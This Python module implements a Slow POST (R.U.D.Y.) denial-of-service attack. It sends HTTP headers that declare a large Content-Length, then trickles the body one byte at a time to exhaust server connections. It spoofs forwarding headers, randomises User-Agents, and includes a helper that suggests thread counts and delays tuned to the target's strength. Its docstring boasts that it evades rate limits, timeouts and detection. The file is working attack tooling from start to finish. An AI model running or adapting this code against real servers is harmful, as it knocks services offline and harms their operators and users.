#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Slow POST Attack Module
=======================

Implements Slow POST attack (also known as Slow Body attack):
- Send POST request with large Content-Length
- Send body data EXTREMELY slowly (1 byte per interval)
- Server must wait for complete body → connection exhaustion
- Bypass many rate limiting and timeout defenses

Attack Mechanism:
1. Send complete HTTP headers with large Content-Length
2. Send body data byte-by-byte with long delays
3. Server keeps connection open waiting for data
4. Multiple connections → server exhaustion

Effectiveness:
- Very effective against upload endpoints (/upload, /api/data)
- Bypasses many timeouts (server receives data, so no timeout)
- Works well with low bandwidth
- Hard to detect (looks like slow upload)

Reference: R.U.D.Y (R-U-Dead-Yet) attack
"""

import socket
import time
import random
import logging
from typing import Optional

class SlowPostAttack:
    """
    Slow POST attack implementation
    
    Sends POST requests with body data sent extremely slowly,
    exhausting server's upload handler connections.
    """
    
    def __init__(
        self,
        target_ip: str,
        target_port: int,
        path: str = "/",
        content_length: int = 1000000,
        byte_delay: float = 10.0,
        worker_id: int = 0
    ):
        """
        Initialize Slow POST attack
        
        Args:
            target_ip: Target IP address
            target_port: Target port
            path: POST endpoint path (default: /)
            content_length: Declared content length (bytes)
            byte_delay: Delay between sending bytes (seconds)
            worker_id: Worker thread ID for logging
        """
        self.target_ip = target_ip
        self.target_port = target_port
        self.path = path
        self.content_length = content_length
        self.byte_delay = byte_delay
        self.worker_id = worker_id
        self.running = True
        
    def stop(self):
        """Stop the attack"""
        self.running = False
    
    def build_post_headers(self, spoofed_ip: Optional[str] = None) -> str:
        """
        Build POST request headers
        
        Args:
            spoofed_ip: Spoofed IP for X-Forwarded-For (optional)
            
        Returns:
            Complete HTTP POST headers
        """
        # Random User-Agent
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]
        user_agent = random.choice(user_agents)
        
        # Build headers
        headers = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {self.target_ip}\r\n"
            f"User-Agent: {user_agent}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {self.content_length}\r\n"
            f"Connection: keep-alive\r\n"
        )
        
        # Add spoofed IP headers if provided
        if spoofed_ip:
            headers += f"X-Forwarded-For: {spoofed_ip}\r\n"
            headers += f"X-Real-IP: {spoofed_ip}\r\n"
            headers += f"Client-IP: {spoofed_ip}\r\n"
        
        # End headers
        headers += "\r\n"
        
        return headers
    
    def send_slow_body(self, sock: socket.socket, stats_callback=None) -> bool:
        """
        Send POST body extremely slowly
        
        Args:
            sock: Connected socket
            stats_callback: Callback function for statistics (optional)
            
        Returns:
            True if completed successfully, False otherwise
        """
        bytes_sent = 0
        
        try:
            while self.running and bytes_sent < self.content_length:
                # Send 1 byte
                byte_to_send = b"X"
                sock.send(byte_to_send)
                bytes_sent += 1
                
                # Update stats if callback provided
                if stats_callback:
                    stats_callback()
                
                # Log progress every 100 bytes
                if bytes_sent % 100 == 0:
                    progress = (bytes_sent / self.content_length) * 100
                    logging.debug(
                        f"Worker {self.worker_id}: Slow POST progress {progress:.1f}% "
                        f"({bytes_sent}/{self.content_length} bytes)"
                    )
                
                # Wait before sending next byte (this is the key!)
                time.sleep(self.byte_delay)
                
            return True
            
        except socket.error as e:
            logging.debug(f"Worker {self.worker_id}: Socket error in slow POST - {e}")
            return False
        except Exception as e:
            logging.error(f"Worker {self.worker_id}: Unexpected error in slow POST - {e}")
            return False
    
    def execute_attack(
        self, 
        sock: socket.socket, 
        spoofed_ip: Optional[str] = None,
        stats_callback=None
    ) -> bool:
        """
        Execute complete slow POST attack
        
        Args:
            sock: Connected socket
            spoofed_ip: Spoofed IP (optional)
            stats_callback: Callback for statistics updates
            
        Returns:
            True if attack executed successfully
        """
        try:
            # Send POST headers
            headers = self.build_post_headers(spoofed_ip)
            sock.send(headers.encode('utf-8'))
            
            logging.debug(
                f"Worker {self.worker_id}: Sent slow POST headers "
                f"(Content-Length: {self.content_length}, delay: {self.byte_delay}s/byte)"
            )
            
            # Update stats for header sent
            if stats_callback:
                stats_callback()
            
            # Send body slowly
            success = self.send_slow_body(sock, stats_callback)
            
            if success:
                logging.debug(f"Worker {self.worker_id}: Slow POST completed successfully")
            
            return success
            
        except Exception as e:
            logging.error(f"Worker {self.worker_id}: Slow POST attack failed - {e}")
            return False

class SlowPostHelper:
    """Helper functions for Slow POST attacks"""
    
    @staticmethod
    def calculate_attack_duration(content_length: int, byte_delay: float) -> float:
        """
        Calculate how long a slow POST attack will take
        
        Args:
            content_length: Declared content length (bytes)
            byte_delay: Delay between bytes (seconds)
            
        Returns:
            Total attack duration in seconds
        """
        return content_length * byte_delay
    
    @staticmethod
    def format_duration(seconds: float) -> str:
        """
        Format duration in human-readable format
        
        Args:
            seconds: Duration in seconds
            
        Returns:
            Formatted string (e.g., "2h 30m 45s")
        """
        hours = int(seconds // 3600)
        minutes = int((seconds % 3600) // 60)
        secs = int(seconds % 60)
        
        parts = []
        if hours > 0:
            parts.append(f"{hours}h")
        if minutes > 0:
            parts.append(f"{minutes}m")
        if secs > 0 or not parts:
            parts.append(f"{secs}s")
        
        return " ".join(parts)
    
    @staticmethod
    def suggest_parameters(target_strength: str) -> dict:
        """
        Suggest optimal parameters based on target strength
        
        Args:
            target_strength: "weak", "medium", or "strong"
            
        Returns:
            Dictionary with suggested parameters
        """
        suggestions = {
            "weak": {
                "content_length": 100000,
                "byte_delay": 5.0,
                "threads": 50,
                "description": "Weak target - moderate settings"
            },
            "medium": {
                "content_length": 500000,
                "byte_delay": 10.0,
                "threads": 100,
                "description": "Medium target - balanced settings"
            },
            "strong": {
                "content_length": 1000000,
                "byte_delay": 15.0,
                "threads": 200,
                "description": "Strong target - aggressive settings"
            }
        }
        
        return suggestions.get(target_strength, suggestions["medium"])

__all__ = ['SlowPostAttack', 'SlowPostHelper']
